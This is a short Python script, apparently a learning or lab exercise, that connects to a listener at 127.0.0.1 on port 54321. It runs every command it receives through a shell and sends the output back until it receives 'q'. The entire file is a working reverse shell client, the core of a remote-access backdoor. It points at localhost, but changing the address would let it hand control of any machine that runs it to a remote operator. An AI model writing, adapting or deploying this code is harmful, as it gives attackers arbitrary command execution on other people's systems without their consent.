#!/usr/bin/python

import socket
import subprocess

# Create socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect socket
s.connect(("127.0.0.1", 54321))

print("Connection Established to Server")

while True:
	# Send/Receive commands
	command = s.recv(1024).decode()
	if(command == "q"):
		print("Connection Closed!")
		break
	else:
		proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		result = proc.stdout.read() + proc.stderr.read()
		s.send(result)

# Close connection
s.close()
